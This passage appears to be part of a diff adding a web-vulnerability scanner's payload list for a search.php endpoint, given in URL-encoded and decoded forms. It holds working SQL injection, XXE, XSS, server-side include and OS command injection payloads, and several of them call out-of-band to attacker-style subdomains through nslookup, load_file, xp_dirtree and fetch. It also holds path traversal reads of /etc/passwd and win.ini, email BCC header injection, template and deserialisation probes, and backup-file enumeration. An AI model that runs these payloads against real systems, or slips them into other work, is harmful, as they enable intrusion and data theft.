+    134 (select extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % meulx SYSTEM "http://2nqrmq67hm6k7bw5lkpuowz8gzmsaiylmc92xr.ABC'||'tor.net/">%meulx;]>'),'/l') from dual) 
+    135 (select load_file('\\\\hf06e5ym91yzzqokdzh9gbrn8ee72xqoscjz9ny.ABCtor.net\\xfv')) 
+    136 syz7q1nv63 
+    137 t5zi4hoyzdobp2ew3b7l6nhzyq4js9g14srif7.ABCtor.net 
+    138 TzozOiJQRE8iOjA6e30= 
+    139 w3zze${511*778}q8atk 
+
+
+--------------------------------------------------------------------------------
+
+Payload used before the test parameter in URL
+
+Regex : POST (.*)test=query HTTP/1.1
+
+URL-Encoded:
+    1 
+    2 /'%22%3e%3csvg/onload%3dfetch%60//ycenbmv36ivgw7l1ageqdso45vbozen6du4mrcf1%5c.ABCtor.net%60%3e?
+    3 /%22--%3e'--%3e%60--%3e%3c!--%23set%20var%3d%22bxy%22%20value%3d%22awxzvyffqu%22--%3e%3c!--%23set%20var%3d%22dz0%22%20value%3d%22cyz1x0hhsw%22--%3e%3c!--%23echo%20var%3d%22bxy%22--%3e%3c!--%23echo%20var%3d%22dz0%22--%3e%3c!--%23exec%20cmd%3d%22nslookup%20-q%3dcname%20xjkmil22dh2f36s0hflpkrv3cuin6du5stjl6bu0.ABCtor.net%22%20--%3e?
+    4 /%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd?
+    5 /%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255cwindows%255cwin.ini?
+    6 /%3cilv%20xmlns%3axi%3d%22http%3a//www.w3.org/2001/XInclude%22%3e%3cxi%3ainclude%20href%3d%22http%3a//ccs1b0vh6wvuwllfaue4d6oi59b2zsntbk37tvi.ABCtor.net/foo%22/%3e%3c/ilv%3e?
+    7 /%3cnpa%20xmlns%3d%22http%3a//a.b/%22%20xmlns%3axsi%3d%22http%3a//www.w3.org/2001/XMLSchema-instance%22%20xsi%3aschemaLocation%3d%22http%3a//a.b/%20http%3a//w63l5kp10gpeq5fz4e8o7qi2zt5mtchc53xqnec.ABCtor.net/npa.xsd%22%3enpa%3c/npa%3e?
+    8 /...%5c.%5c...%5c.%5c...%5c.%5c...%5c.%5c...%5c.%5c...%5c.%5c...%5c.%5c...%5c.%5c...%5c.%5c...%5c.%5cwindows%5cwin.ini?
+    9 /..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini%00search.php?
+    10 /..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini?
+    11 /..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwinnt%5cwin.ini%00search.php?
+    12 /..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwinnt%5cwin.ini?
+    13 /...%5c./...%5c./...%5c./...%5c./...%5c./...%5c./...%5c./...%5c./...%5c./...%5c./windows/win.ini?
+    14 /.../.%5c.../.%5c.../.%5c.../.%5c.../.%5c.../.%5c.../.%5c.../.%5c.../.%5c.../.%5cwindows/win.ini?
+    15 /%5cwindows%5cwin.ini?
+    16 /b7j06zqg1vqtrkge5t9385jh0861urij6ayxold.ABCtor.net?
+    17 /backup_search.php?
+    18 /bak_search.php?
+    19 /%c0%ae%c0%ae%c0%9c%c0%ae%c0%ae%c0%9c%c0%ae%c0%ae%c0%9c%c0%ae%c0%ae%c0%9c%c0%ae%c0%ae%c0%9c%c0%ae%c0%ae%c0%9c%c0%ae%c0%ae%c0%9c%c0%ae%c0%ae%c0%9c%c0%ae%c0%ae%c0%9c%c0%ae%c0%ae%c0%9cwindows%c0%9cwin.ini?
+    20 /%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%afetc%c0%afpasswd?
+    21 /c%3a%5cwindows%5cwin.ini%00search.php?
+    22 /c%3a%5cwindows%5cwin.ini?
+    23 /Copy%20of%20search.php?
+    24 /d6k251pi0xpvqmfg4v8577ijza53tthl9901nrbg?
+    25 /e4cbrzfr81?
+    26 /../../../../../../../../../../../../../../../../etc/passwd%00search.php?
+    27 /..././..././..././..././..././..././..././..././..././..././etc/passwd?
+    28 /../../../../../../../../../../../../../../../../etc/passwd?
+    29 //etc/passwd?
+    30 /eval(compile('for%20x%20in%20range(1)%3a%5cn%20import%20time%5cn%20time.sleep(20)'%2c'a'%2c'single'))?
+    31 /file%3a///c%3a/windows/win.ini?
+    32 /file%3a///etc/passwd?
+    33 /g1h2u$%7b206*635%7dytbyg?
+    34 /http%3a//fh04g30kbz0x1oqifxj7i9tlacg54vslgc8zynn.ABCtor.net/%3fsearch.php?
+    35 /Http%3a//punetdduo9d7ey3ss7whvj6vnmtfh55y7myel49t.ABCtor.net/%3fsearch.php?
+    36 /https%3a//h8q675rm21rzsqhk6za99bkn1e77vxjo7fz2pqe.ABCtor.net/%3fsearch.php?
+    37 /javascript%3a/*%3c/script%3e%3cimg/onerror%3d'-/%22/-/%20onmouseover%3d1/-/[%60*/[]/[(new(Image)).src%3d(/%3b/%2b/7s0wrvbcmrbpcg1aqpuzt14dl4rxfn3fu3lv8lwaX%3b.ABCtor.net/).replace(/.%3b/g%2c[])]//'src%3d%3e?
+    38 /nslookup%20-q%3dcname%20pzseydiut9i7jy8sx71h0jbvsmyfm5aydm4er4ft.ABCtor.net.%26?
+    39 /O%3a3%3a%22PDO%22%3a0%3a%7b%7d?
+    40 /old_search.php?
+    41 /search1.php?
+    42 /search.1?
+    43 /search1?
+    44 /search%20-%20Copy.php?
+    45 /search%20(copy).php?
+    46 /search.7z?
+    47 /search.ar?
+    48 /search.a?
+    49 /search_backup.php?
+    50 /search.backup?
+    51 /search_backup?
+    52 /search.bac?
+    53 /search_bak.php?
+    54 /search.bak?
+    55 /search_bak?
+    56 /searchbak?
+    57 /search.bz2?
+    58 /search.cbz?
+    59 /search.ear?
+    60 /search.exe?
+    61 /search.gz?
+    62 /search.include?
+    63 /search.inc?
+    64 /searchinc?
+    65 /search.jar?
+    66 /search.lzma?
+    67 /search_old.php?
+    68 /search.old?
+    69 /search_old?
+    70 /searchold?
+    71 /search.php%0d%0aBCC%3asokhng7xic7a81xvmaqkpm0yhpnib8z0sojg66uv@ABCtor.net%0d%0ackl%3a%20v?
+    72 /search.php/0stprob5mkbic913qiustu46lxrqfg38vwpjh76?
+    73 /search.php/1%0d%0aBCC%3achx1g00hbw0u1lqffuj4i6tia9g24sskl8fv7jw@ABCtor.net%0d%0awza%3a%20a?
+    74 /search.php/119704201%20or%208580%3d08580?
+    75 /search.php/1'%20and%20'2215'%3d'2222?
+    76 /search.php/1'%20and%204316%3d4325--%20?
+    77 /search.php/1%20and%206923%3d06923?
+    78 /search.php/1%20and%207211%3d7219?
+    79 /search.php/1%20and%208588%3d08588--%20?
+    80 /search.php/1%20and%208590%3d8595--%20?
+    81 /search.php/1'%20and%20'8798'%3d'8798?
+    82 /search.php/1'%20and%209903%3d9903--%20?
+    83 /search.php/1%20and%20(select*from(select(sleep(20)))a)--%20?
+    84 /search.php/1%20into%20outfile%20'%5c%5c%5c%5cq4vf3envyan8ozdt286i5kgwxn3gr6fxjld85wu.ABCtor.net%5c%5cljs'%3b%20--%20?
+    85 /search.php/1%20waitfor%20delay'0%3a0%3a20'--?
+    86 /search.php/1%22?
+    87 /search.php/123476699%20or%201040%3d01040--%20?
+    88 /search.php/1%25%7dgnys9'%2f%22%3cyrcam?
+    89 /search.php/127311914%20or%205487%3d5494?
+    90 /search.php/1'%2b(function()%7bif(typeof%20s6rve%3d%3d%3d%22undefined%22)%7bvar%20a%3dnew%20Date()%3bdo%7bvar%20b%3dnew%20Date()%3b%7dwhile(b-a%3c20000)%3bs6rve%3d1%3b%7d%7d())%2b'?
+    91 /search.php/1'%2b(select%20load_file('%5c%5c%5c%5cbm10lz5ggv5t6kvekto3n5yhf8l19rxi06utmhb.ABCtor.net%5c%5cnnk'))%2b'?
+    92 /search.php/1%2b(select*from(select(sleep(20)))a)%2b?
+    93 /search.php/1%2c0)waitfor%20delay'0%3a0%3a20'--?
+    94 /search.php/1%3bdeclare%20@q%20varchar(99)%3bset%20@q%3d'%5c%5ckh59g80pb4021tqnf2jcietqahga40srifc24qt.ABC'%2b'tor.net%5cufp'%3b%20exec%20master.dbo.xp_dirtree%20@q%3b--%20?
+    95 /search.php/1)%3bdeclare%20@q%20varchar(99)%3bset%20@q%3d'%5c%5cqjdfie2vda283zsth8likkvwcnig66uxmlg88wx.ABC'%2b'tor.net%5cjdd'%3b%20exec%20master.dbo.xp_dirtree%20@q%3b--%20?
+    96 /search.php/1'%3bdeclare%20@q%20varchar(99)%3bset%20@q%3d'%5c%5cxghmflz2ahzf06p0efiphrs39ufn3dr4iscf43t.ABC'%2b'tor.net%5cidk'%3b%20exec%20master.dbo.xp_dirtree%20@q%3b--%20?
+    97 /search.php/1')%3bdeclare%20@q%20varchar(99)%3bset%20@q%3d'%5c%5czilohn14cj1h28r2ghkrjtu5bwhp5ft6mugh85x.ABC'%2b'tor.net%5cfzg'%3b%20exec%20master.dbo.xp_dirtree%20@q%3b--%20?
+    98 /search.php/1%3e%0d%0aBCC%3a7nvwmv6chr6p7gwalppzo1zdg4mxanyfs3mqee3@ABCtor.net%0d%0asmx%3a%20a?
+    99 /search.php/161591519'%20or%201286%3d1286--%20?
+    100 /search.php/173082148%20or%208938%3d8940--%20?
+    101 /search.php/1'%7c%7c(select%20extractvalue(xmltype('%3c%3fxml%20version%3d%221.0%22%20encoding%3d%22UTF-8%22%3f%3e%3c!DOCTYPE%20root%20[%20%3c!ENTITY%20%25%20mlogq%20SYSTEM%20%22http%3a%2f%2f9y8yxxhesthrii7cwr01z3afr6xzlp9txnkf84.ABC'%7c%7c'tor.net%2f%22%3e%25mlogq%3b]%3e')%2c'%2fl')%20from%20dual)%7c%7c'?
+    102 /search.php/1%7d%7dsejh3'%2f%22%3capjqa?
+    103 /search.php/186727691'%20or%201291%3d1293--%20?
+    104 /search.php/189474981'%20or%20'5509'%3d'5509?
+    105 /search.php/193238211'%20or%20'8952'%3d'8959?
+    106 /search.php/1m6r48%25%3ev6hmx'%2f%22%3cm22ow?
+    107 /search.php.1?
+    108 /search.php1?
+    109 /search.php/1'?
+    110 /search.php/1)waitfor%20delay'0%3a0%3a20'--?
+    111 /search.php'%20and%20'5839'%3d'5846?
+    112 /search.php'%20and%206040%3d6049--%20?
+    113 /search.php'%20and%206155%3d6155--%20?
+    114 /search.php'%20and%20'9538'%3d'9538?
+    115 /search.php'%20and%20(select*from(select(sleep(20)))a)--%20?
+    116 /search.php'%20waitfor%20delay'0%3a0%3a20'--?
+    117 /search.php/'%22%3e%3csvg%2fonload%3dfetch%60%2f%2f5lrukt4afp4n5eu8jnnxmzxbe2kv8lwdm1go8cx%5c.ABCtor.net%60%3e?
+    118 /search.php/%22--%3e'--%3e%60--%3e%3c!--%23set%20var%3d%22vo9%22%20value%3d%22un8jmi6zhe%22--%3e%3c!--%23set%20var%3d%22xqb%22%20value%3d%22wpalok81jg%22--%3e%3c!--%23echo%20var%3d%22vo9%22--%3e%3c!--%23echo%20var%3d%22xqb%22--%3e%3c!--%23exec%20cmd%3d%22nslookup%20-q%3dcname%20hav695tm41tzuqjk8zc9bbmn3e97xxlpjdd05ou.ABCtor.net%22%20--%3e?
+    119 /search.php'%22%600%26nslookup%20-q%3dcname%20qysfxehvsah8iz7tw80izkawrnxgl693xuphf54.ABCtor.net.%26%60'?
+    120 /search.php%22%7cecho%20jb5il08mt6%20h2pbzjs944%20%7c%7c?
+    121 /search.php%22%7cping%20-n%2021%20127.0.0.1%20%7c%7c?
+    122 /search.php%22?
+    123 /search.php%25%7dn1a9z'/%22%3ch1pab?
+    124 /search.php%26echo%20hliikcb72l%200xemi7sqek%26?
+    125 /search.php%26nslookup%20-q%3dcname%20yprnom83ji8g97y1ngrqqs14ivooce09o0gn6bv.ABCtor.net.%26'%5c%22%600%26nslookup%20-q%3dcname%20yprnom83ji8g97y1ngrqqs14ivooce09o0gn6bv.ABCtor.net.%26%60'?
+    126 /search.php%26ping%20-n%2021%20127.0.0.1%26?
+    127 /search.php'%2beval(compile('for%20x%20in%20range(1)%3a%5cn%20import%20time%5cn%20time.sleep(20)'%2c'a'%2c'single'))%2b'?
+    128 /search.php'%2b(function()%7bif(typeof%20oeoya%3d%3d%3d%22undefined%22)%7bvar%20a%3dnew%20Date()%3bdo%7bvar%20b%3dnew%20Date()%3b%7dwhile(b-a%3c20000)%3boeoya%3d1%3b%7d%7d())%2b'?
+    129 /search.php'%2b(select%20load_file('%5c%5c%5c%5cje18d7xo83x1ysnmc1gbfdqp7gd91zpqsej66wul.ABCtor.net%5c%5cdlj'))%2b'?
+    130 /search.php'%2b(select*from(select(sleep(20)))a)%2b'?
+    131 /search.php'%2bsleep(20.to_i)%2b'?
+    132 /search.php'%2c0)waitfor%20delay'0%3a0%3a20'--?
+    133 /search.php%2c(select*from(select(sleep(20)))a)?
+    134 /search.php%3bdeclare%20@q%20varchar(99)%3bset%20@q%3d'%5c%5c1prqop86jl8j9ay4njrtqv17iyorch08qwho4es3.ABC'%2b'tor.net%5cami'%3b%20exec%20master.dbo.xp_dirtree%20@q%3b--%20?
+    135 /search.php)%3bdeclare%20@q%20varchar(99)%3bset%20@q%3d'%5c%5cfl44k34kfz4x5ouijxn7m9xleck58vwmoaf22sqh.ABC'%2b'tor.net%5cpsc'%3b%20exec%20master.dbo.xp_dirtree%20@q%3b--%20?
+    136 /search.php'%3bdeclare%20@q%20varchar(99)%3bset%20@q%3d'%5c%5cj4o837noy3n1osdm216b5dgpxg39rzfq6ex6kw8l.ABC'%2b'tor.net%5cgbk'%3b%20exec%20master.dbo.xp_dirtree%20@q%3b--%20?
+    137 /search.php')%3bdeclare%20@q%20varchar(99)%3bset%20@q%3d'%5c%5cykmnjm33ei3g47t1igmqlsw4dvjo7ev5otfl2bq0.ABC'%2b'tor.net%5csav'%3b%20exec%20master.dbo.xp_dirtree%20@q%3b--%20?
+    138 /search.php%3e%0d%0aBCC%3a0pqpoo85jk8i99y3nirsqu16ixoqcg08uwlo8ew3@ABCtor.net%0d%0adbd%3a%20s?
+    139 /search.php]]%3e%3e%3c?
+    140 /search.php51505449'%20or%20'5738'%3d'5745?
+    141 /search.php54335499'%20or%205152%3d5152--%20?
+    142 /search.php..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini?
+    143 /search.php..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwinnt%5cwin.ini?
+    144 /search.php62828572'%20or%20'2562'%3d'2562?
+    145 /search.php%7b$%7bsleep(20)%7d%7d?
+    146 /search.php'%7c%7c(select%20extractvalue(xmltype('%3c%3fxml%20version%3d%221.0%22%20encoding%3d%22UTF-8%22%3f%3e%3c!DOCTYPE%20root%20[%20%3c!ENTITY%20%25%20jdkdd%20SYSTEM%20%22http%3a//r91g8fsw3bs9t0iu79bjallx2o8hw7kb820pqdf.ABC'%7c%7c'tor.net/%22%3e%25jdkdd%3b]%3e')%2c'/l')%20from%20dual)%7c%7c'?
+    147 /search.php'%7cecho%200t6opcrw54%20q0dgngpxvx%20%23xzwx?
+    148 /search.php%7cecho%20vm67vrr509%20paauvu1wni%7c%7ca%20%23'%20%7cecho%20vm67vrr509%20paauvu1wni%7c%7ca%20%23%7c%22%20%7cecho%20vm67vrr509%20paauvu1wni%7c%7ca%20%23?
+    149 /search.php%7cnslookup%20-q%3dcname%200qrppo95kk9ia9z3oissru26jxpqdg1cp3hq7ew.ABCtor.net.%26?
+    150 /search.php'%7cping%20-c%2021%20127.0.0.1%20%23?
+    151 /search.php%7cping%20-c%2021%20127.0.0.1%7c%7cx?
+    152 /search.php%7cping%20-n%2021%20127.0.0.1%7c%7c%60ping%20-c%2021%20127.0.0.1%60%20%23'%20%7cping%20-n%2021%20127.0.0.1%7c%7c%60ping%20-c%2021%20127.0.0.1%60%20%23%5c%22%20%7cping%20-n%2021%20127.0.0.1?
+    153 /search.php%7d%7du0uqf'/%22%3cdiyf4?
+    154 /search.php.7z?
+    155 /search.php87550038'%20or%208600%3d8605--%20?
+    156 /search.php.ar?
+    157 /search.php.a?
+    158 /search.php.backup?
+    159 /search.php_backup?
+    160 /search.php.bac?
+    161 /search.php.bak?
+    162 /search.php_bak?
+    163 /search.phpbak?
+    164 /search.php.bz2?
+    165 /search.php/c0tnd7/?
+    166 /search.php.cbz?
+    167 /search.php/e4j13$%7b532*581%7dvbhc3?
+    168 /search.php.ear?
+    169 /search.php../../../../../../../../../../../../../../../../etc/passwd?
+    170 /search.php/eval(compile('for%20x%20in%20range(1)%3a%5cn%20import%20time%5cn%20time.sleep(20)'%2c'a'%2c'single'))?
+    171 /search.php.exe?
+    172 /search.php/(function()%7bif(typeof%20hfh8n%3d%3d%3d'undefined')%7bvar%20a%3dnew%20Date()%3bdo%7bvar%20b%3dnew%20Date()%3b%7dwhile(b-a%3c20000)%3bhfh8n%3d1%3b%7d%7d())?
+    173 /search.php/gm1dtd69l5?
+    174 /search.php.gz?
+    175 /search.phpinc?
+    176 /search.php.jar?
+    177 /search.php/javascript%3a%2f*%3c%2fscript%3e%3cimg%2fonerror%3d'-%2f%22%2f-%2f%20onmouseover%3d1%2f-%2f[%60*%2f[]%2f[(new(Image)).src%3d(%2f%3b%2f%2b%2fvbakaju05fudv4ky9ddncpn14salybm3dr7ez2oX%3b.ABCtor.net%2f).replace(%2f.%3b%2fg%2c[])]%2f%2f'src%3d%3e?
+    178 /search.php.lzma?
+    179 /search.php/me9k8%7b%7b510*618%7d%7dp4zrk?
+    180 /search.php;/o04luz/?
+    181 /search.php/O%3a3%3a%22PDO%22%3a0%3a%7b%7d?
+    182 /search.php.old?
+    183 /search.php_old?
+    184 /search.phpold?
+    185 /search.php.rar?
+    186 /search.phpreex3%25%3ev84wn'/%22%3cjs11v?
+    187 /search.php/(select%20extractvalue(xmltype('%3c%3fxml%20version%3d%221.0%22%20encoding%3d%22UTF-8%22%3f%3e%3c!DOCTYPE%20root%20[%20%3c!ENTITY%20%25%20mlogq%20SYSTEM%20%22http%3a%2f%2fi9s786sn32s0tril70baaclo2f88wyk18vvnjc.ABC'%7c%7c'tor.net%2f%22%3e%25mlogq%3b]%3e')%2c'%2fl')%20from%20dual)?
+    188 /search.php/(select%20load_file('%5c%5c%5c%5cg0h5z4jlu0jykp9jyy281acmtdz6nwbndb7yzmo.ABCtor.net%5c%5cqhj'))?
+    189 /search.php'(select*from(select(sleep(20)))a)'?
+    190 /search.php/(select*from(select(sleep(20)))a)?
+    191 /search.php'.sleep(20).'?
+    192 /search.php.tar.7z?
+    193 /search.php.tar.bz2?
+    194 /search.php.tar.gz?
+    195 /search.php.tar.lzma?
+    196 /search.php.tar?
+    197 /search.php.tar.xz?
+    198 /search.php'?
+    199 /search.php?
+    200 /search.php~?
+    201 /search.php/TzozOiJQRE8iOjA6e30%3d?
+    202 /search.php')waitfor%20delay'0%3a0%3a20'--?
+    203 /search.php.war?
+    204 /search.php.wim?
+    205 /search.php../../../../../../../../../../../../../../../../windows/win.ini?
+    206 /search.php../../../../../../../../../../../../../../../../winnt/win.ini?
+    207 /search.php.xz?
+    208 /search.phpykrnoo74qi?
+    209 /search.php.zip?
+    210 /search.rar?
+    211 /search.tar.7z?
+    212 /search.tar.bz2?
+    213 /search.tar.gz?
+    214 /search.tar.lzma?
+    215 /search.tar?
+    216 /search.tar.xz?
+    217 /search.war?
+    218 /search.wim?
+    219 /search.xz?
+    220 /search.zip?
+    221 /(select%20extractvalue(xmltype('%3c%3fxml%20version%3d%221.0%22%20encoding%3d%22UTF-8%22%3f%3e%3c!DOCTYPE%20root%20[%20%3c!ENTITY%20%25%20jdkdd%20SYSTEM%20%22http%3a//xyzmxlh2shhfi670wf0pzra3ruxnld9gx7pufi4.ABC'%7c%7c'tor.net/%22%3e%25jdkdd%3b]%3e')%2c'/l')%20from%20dual)?
+    222 /(select%20load_file('%5c%5c%5c%5co9yd8cst38s6txir76bgailu2l8ew4kvmjdb01oq.ABCtor.net%5c%5chdk'))?
+    223 /TzozOiJQRE8iOjA6e30%3d?
+    224 /v6kpf%7b%7b160*492%7d%7df8k5y?
+    225 /../../../../../../../../../../../../../../../../windows/win.ini?
+    226 /../../../../../../../../../../../../../../../../winnt/win.ini?
+
+URL-Decoded:
+    1 
+    2 /'"><svg/onload=fetch`//ycenbmv36ivgw7l1ageqdso45vbozen6du4mrcf1\.ABCtor.net`>?
+    3 /"-->'-->`--><!--#set var="bxy" value="awxzvyffqu"--><!--#set var="dz0" value="cyz1x0hhsw"--><!--#echo var="bxy"--><!--#echo var="dz0"--><!--#exec cmd="nslookup -q=cname xjkmil22dh2f36s0hflpkrv3cuin6du5stjl6bu0.ABCtor.net" -->?
+    4 /%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd?
+    5 /%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows%5cwin.ini?
+    6 /<ilv xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="http://ccs1b0vh6wvuwllfaue4d6oi59b2zsntbk37tvi.ABCtor.net/foo"/></ilv>?
+    7 /<npa xmlns="http://a.b/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://a.b/ http://w63l5kp10gpeq5fz4e8o7qi2zt5mtchc53xqnec.ABCtor.net/npa.xsd">npa</npa>?
+    8 /...\.\...\.\...\.\...\.\...\.\...\.\...\.\...\.\...\.\...\.\windows\win.ini?
+    9 /..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\windows\win.ini.search.php?
+    10 /..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\windows\win.ini?
+    11 /..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\winnt\win.ini.search.php?
+    12 /..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\winnt\win.ini?
+    13 /...\./...\./...\./...\./...\./...\./...\./...\./...\./...\./windows/win.ini?
+    14 /.../.\.../.\.../.\.../.\.../.\.../.\.../.\.../.\.../.\.../.\windows/win.ini?
+    15 /\windows\win.ini?
+    16 /b7j06zqg1vqtrkge5t9385jh0861urij6ayxold.ABCtor.net?
+    17 /backup_search.php?
+    18 /bak_search.php?
+    19 /À®À®À.À®À®À.À®À®À.À®À®À.À®À®À.À®À®À.À®À®À.À®À®À.À®À®À.À®À®À.windowsÀ.win.ini?
+    20 /À®À®À¯À®À®À¯À®À®À¯À®À®À¯À®À®À¯À®À®À¯À®À®À¯À®À®À¯À®À®À¯À®À®À¯etcÀ¯passwd?
+    21 /c:\windows\win.ini.search.php?
+    22 /c:\windows\win.ini?
+    23 /Copy of search.php?
+    24 /d6k251pi0xpvqmfg4v8577ijza53tthl9901nrbg?
+    25 /e4cbrzfr81?
+    26 /../../../../../../../../../../../../../../../../etc/passwd.search.php?
+    27 /..././..././..././..././..././..././..././..././..././..././etc/passwd?
+    28 /../../../../../../../../../../../../../../../../etc/passwd?
+    29 //etc/passwd?
+    30 /eval(compile('for x in range(1):\n import time\n time.sleep(20)','a','single'))?
+    31 /file:///c:/windows/win.ini?
+    32 /file:///etc/passwd?
+    33 /g1h2u${206*635}ytbyg?
+    34 /http://fh04g30kbz0x1oqifxj7i9tlacg54vslgc8zynn.ABCtor.net/?search.php?
+    35 /Http://punetdduo9d7ey3ss7whvj6vnmtfh55y7myel49t.ABCtor.net/?search.php?
+    36 /https://h8q675rm21rzsqhk6za99bkn1e77vxjo7fz2pqe.ABCtor.net/?search.php?
+    37 /javascript:/*</script><img/onerror='-/"/-/ onmouseover=1/-/[`*/[]/[(new(Image)).src=(/;/+/7s0wrvbcmrbpcg1aqpuzt14dl4rxfn3fu3lv8lwaX;.ABCtor.net/).replace(/.;/g,[])]//'src=>?
+    38 /nslookup -q=cname pzseydiut9i7jy8sx71h0jbvsmyfm5aydm4er4ft.ABCtor.net.&?
+    39 /O:3:"PDO":0:{}?
+    40 /old_search.php?
+    41 /search1.php?
+    42 /search.1?
+    43 /search1?
+    44 /search - Copy.php?
+    45 /search (copy).php?
+    46 /search.7z?
+    47 /search.ar?
+    48 /search.a?
+    49 /search_backup.php?
+    50 /search.backup?
+    51 /search_backup?
+    52 /search.bac?
+    53 /search_bak.php?
+    54 /search.bak?
+    55 /search_bak?
+    56 /searchbak?
+    57 /search.bz2?
+    58 /search.cbz?
+    59 /search.ear?
+    60 /search.exe?
+    61 /search.gz?
+    62 /search.include?
+    63 /search.inc?
+    64 /searchinc?
+    65 /search.jar?
+    66 /search.lzma?
+    67 /search_old.php?
+    68 /search.old?
+    69 /search_old?
+    70 /searchold?
+    71 /search.php
+    BCC:sokhng7xic7a81xvmaqkpm0yhpnib8z0sojg66uv@ABCtor.net
+    ckl: v?
+    72 /search.php/0stprob5mkbic913qiustu46lxrqfg38vwpjh76?
+    73 /search.php/1
+    BCC:chx1g00hbw0u1lqffuj4i6tia9g24sskl8fv7jw@ABCtor.net
+    wza: a?
+    74 /search.php/119704201 or 8580=08580?
+    75 /search.php/1' and '2215'='2222?
+    76 /search.php/1' and 4316=4325-- ?
+    77 /search.php/1 and 6923=06923?
+    78 /search.php/1 and 7211=7219?
+    79 /search.php/1 and 8588=08588-- ?
+    80 /search.php/1 and 8590=8595-- ?
+    81 /search.php/1' and '8798'='8798?
+    82 /search.php/1' and 9903=9903-- ?
+    83 /search.php/1 and (select*from(select(sleep(20)))a)-- ?
+    84 /search.php/1 into outfile '\\\\q4vf3envyan8ozdt286i5kgwxn3gr6fxjld85wu.ABCtor.net\\ljs'; -- ?
+    85 /search.php/1 waitfor delay'0:0:20'--?
+    86 /search.php/1"?
+    87 /search.php/123476699 or 1040=01040-- ?
+    88 /search.php/1%}gnys9'/"<yrcam?
+    89 /search.php/127311914 or 5487=5494?
+    90 /search.php/1'+(function(){if(typeof s6rve==="undefined"){var a=new Date();do{var b=new Date();}while(b-a<20000);s6rve=1;}}())+'?
+    91 /search.php/1'+(select load_file('\\\\bm10lz5ggv5t6kvekto3n5yhf8l19rxi06utmhb.ABCtor.net\\nnk'))+'?
+    92 /search.php/1+(select*from(select(sleep(20)))a)+?
+    93 /search.php/1,0)waitfor delay'0:0:20'--?
+    94 /search.php/1;declare @q varchar(99);set @q='\\kh59g80pb4021tqnf2jcietqahga40srifc24qt.ABC'+'tor.net\ufp'; exec master.dbo.xp_dirtree @q;-- ?
+    95 /search.php/1);declare @q varchar(99);set @q='\\qjdfie2vda283zsth8likkvwcnig66uxmlg88wx.ABC'+'tor.net\jdd'; exec master.dbo.xp_dirtree @q;-- ?
+    96 /search.php/1';declare @q varchar(99);set @q='\\xghmflz2ahzf06p0efiphrs39ufn3dr4iscf43t.ABC'+'tor.net\idk'; exec master.dbo.xp_dirtree @q;-- ?
+    97 /search.php/1');declare @q varchar(99);set @q='\\zilohn14cj1h28r2ghkrjtu5bwhp5ft6mugh85x.ABC'+'tor.net\fzg'; exec master.dbo.xp_dirtree @q;-- ?
+    98 /search.php/1>
+    BCC:7nvwmv6chr6p7gwalppzo1zdg4mxanyfs3mqee3@ABCtor.net
+    smx: a?
+    99 /search.php/161591519' or 1286=1286-- ?
+    100 /search.php/173082148 or 8938=8940-- ?
+    101 /search.php/1'||(select extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % mlogq SYSTEM "http://9y8yxxhesthrii7cwr01z3afr6xzlp9txnkf84.ABC'||'tor.net/">%mlogq;]>'),'/l') from dual)||'?
+    102 /search.php/1}}sejh3'/"<apjqa?
+    103 /search.php/186727691' or 1291=1293-- ?
+    104 /search.php/189474981' or '5509'='5509?
+    105 /search.php/193238211' or '8952'='8959?
+    106 /search.php/1m6r48%>v6hmx'/"<m22ow?
+    107 /search.php.1?
+    108 /search.php1?
+    109 /search.php/1'?
+    110 /search.php/1)waitfor delay'0:0:20'--?
+    111 /search.php' and '5839'='5846?
+    112 /search.php' and 6040=6049-- ?
+    113 /search.php' and 6155=6155-- ?
+    114 /search.php' and '9538'='9538?
+    115 /search.php' and (select*from(select(sleep(20)))a)-- ?
+    116 /search.php' waitfor delay'0:0:20'--?
+    117 /search.php/'"><svg/onload=fetch`//5lrukt4afp4n5eu8jnnxmzxbe2kv8lwdm1go8cx\.ABCtor.net`>?
+    118 /search.php/"-->'-->`--><!--#set var="vo9" value="un8jmi6zhe"--><!--#set var="xqb" value="wpalok81jg"--><!--#echo var="vo9"--><!--#echo var="xqb"--><!--#exec cmd="nslookup -q=cname hav695tm41tzuqjk8zc9bbmn3e97xxlpjdd05ou.ABCtor.net" -->?
